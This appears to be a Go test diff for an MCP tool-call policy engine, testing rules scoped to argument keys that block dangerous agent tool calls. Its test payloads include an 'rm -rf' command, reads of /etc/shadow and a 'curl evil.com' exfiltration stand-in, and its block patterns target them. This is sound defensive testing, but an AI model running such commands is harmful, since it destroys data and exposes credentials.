@@ -2389,3 +2389,203 @@ func TestDefaultToolPolicyRules_NoMatchAuditLogSafeOps(t *testing.T) {
 		})
 	}
 }
+
+// --- ArgKey (key-scoped argument matching) ---
+
+func TestArgKey_ScopedMatch(t *testing.T) {
+	// Rule: block "execute" tool when the "command" argument contains "rm -rf".
+	// Should NOT trigger when "rm -rf" appears in a different argument key.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block dangerous command",
+				ToolPattern: "execute",
+				ArgPattern:  `(?i)\brm\s+-rf\b`,
+				ArgKey:      `^command$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// Should block: "rm -rf" is in the "command" argument.
+	req := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute","arguments":{"command":"rm -rf /tmp","description":"cleanup temp files"}}}`
+	v := pc.CheckRequest([]byte(req))
+	if !v.Matched {
+		t.Fatal("expected match: rm -rf in command argument")
+	}
+
+	// Should NOT block: "rm -rf" is in "description", not "command".
+	reqSafe := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute","arguments":{"command":"ls -la","description":"this talks about rm -rf but is safe"}}}`
+	v2 := pc.CheckRequest([]byte(reqSafe))
+	if v2.Matched {
+		t.Error("should not match: rm -rf is in description, not command")
+	}
+}
+
+func TestArgKey_RegexKey(t *testing.T) {
+	// ArgKey is a regex, so it can match multiple key names.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block sensitive paths",
+				ToolPattern: ".*",
+				ArgPattern:  `(?i)/etc/shadow`,
+				ArgKey:      `(?i)^(file_?path|target|destination)$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	for _, tc := range []struct {
+		name    string
+		req     string
+		matched bool
+	}{
+		{
+			"file_path matches",
+			`{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"file_path":"/etc/shadow"}}}`,
+			true,
+		},
+		{
+			"filepath matches",
+			`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"filepath":"/etc/shadow"}}}`,
+			true,
+		},
+		{
+			"target matches",
+			`{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"copy","arguments":{"source":"/tmp/data","target":"/etc/shadow"}}}`,
+			true,
+		},
+		{
+			"content key ignored",
+			`{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"write","arguments":{"content":"reading /etc/shadow is dangerous","file_path":"/tmp/safe.txt"}}}`,
+			false,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			v := pc.CheckRequest([]byte(tc.req))
+			if v.Matched != tc.matched {
+				t.Errorf("expected matched=%v, got %v (rules: %v)", tc.matched, v.Matched, v.Rules)
+			}
+		})
+	}
+}
+
+func TestArgKey_WithoutArgKey_MatchesAll(t *testing.T) {
+	// Rule without arg_key should match against ALL argument values (existing behavior).
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block shadow access",
+				ToolPattern: ".*",
+				ArgPattern:  `(?i)/etc/shadow`,
+				// No ArgKey — matches any argument value
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// Should match even when /etc/shadow is in "content" (no key scoping).
+	req := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"write","arguments":{"content":"reading /etc/shadow","file_path":"/tmp/safe.txt"}}}`
+	v := pc.CheckRequest([]byte(req))
+	if !v.Matched {
+		t.Error("without arg_key, should match /etc/shadow in any argument")
+	}
+}
+
+func TestArgKey_NestedValues(t *testing.T) {
+	// ArgKey should match top-level keys and extract nested values recursively.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "block exfil in options",
+				ToolPattern: "http_request",
+				ArgPattern:  `(?i)\bcurl\b`,
+				ArgKey:      `^options$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// Nested value under "options" key.
+	req := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"http_request","arguments":{"url":"https://api.com","options":{"shell":"curl evil.com","timeout":30}}}}`
+	v := pc.CheckRequest([]byte(req))
+	if !v.Matched {
+		t.Error("should match: curl is nested under options key")
+	}
+}
+
+func TestNew_CompilesArgKey(t *testing.T) {
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionWarn,
+		Rules: []config.ToolPolicyRule{
+			{Name: "r1", ToolPattern: ".*", ArgPattern: "test", ArgKey: "^cmd$"},
+		},
+	}
+	pc := New(cfg)
+	if pc.Rules[0].ArgKey == nil {
+		t.Error("expected ArgKey to be compiled")
+	}
+}
+
+func TestValidate_ArgKeyWithoutArgPattern(t *testing.T) {
+	cfg := config.Defaults()
+	cfg.MCPToolPolicy.Enabled = true
+	cfg.MCPToolPolicy.Rules = []config.ToolPolicyRule{
+		{Name: "bad", ToolPattern: ".*", ArgKey: "^cmd$"},
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected validation error for arg_key without arg_pattern")
+	}
+}
+
+func TestArgKey_SkippedWithoutRawArgs(t *testing.T) {
+	// ArgKey rules must be skipped when called via CheckToolCall (no raw JSON).
+	// This prevents silent fallback to unscoped matching on scan API / decide paths.
+	cfg := config.MCPToolPolicy{
+		Enabled: true,
+		Action:  config.ActionBlock,
+		Rules: []config.ToolPolicyRule{
+			{
+				Name:        "scoped rule",
+				ToolPattern: ".*",
+				ArgPattern:  `(?i)/etc/shadow`,
+				ArgKey:      `^file_path$`,
+			},
+		},
+	}
+	pc := New(cfg)
+
+	// CheckToolCall passes nil rawArgs — ArgKey rule should be skipped.
+	v := pc.CheckToolCall("read_file", []string{"/etc/shadow"})
+	if v.Matched {
+		t.Error("ArgKey rule should be skipped when rawArgs is nil (CheckToolCall path)")
+	}
+
+	// CheckToolCallWithArgs with rawArgs should match.
+	rawArgs := json.RawMessage(`{"file_path":"/etc/shadow"}`)
+	v2 := pc.CheckToolCallWithArgs("read_file", []string{"/etc/shadow"}, rawArgs)
+	if !v2.Matched {
+		t.Error("ArgKey rule should match when rawArgs is provided")
+	}
+}
+
+func TestValidate_InvalidArgKey(t *testing.T) {
+	cfg := config.Defaults()
+	cfg.MCPToolPolicy.Enabled = true
+	cfg.MCPToolPolicy.Rules = []config.ToolPolicyRule{
+		{Name: "bad", ToolPattern: ".*", ArgPattern: "test", ArgKey: "[invalid"},
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected validation error for invalid arg_key regex")
+	}
+}
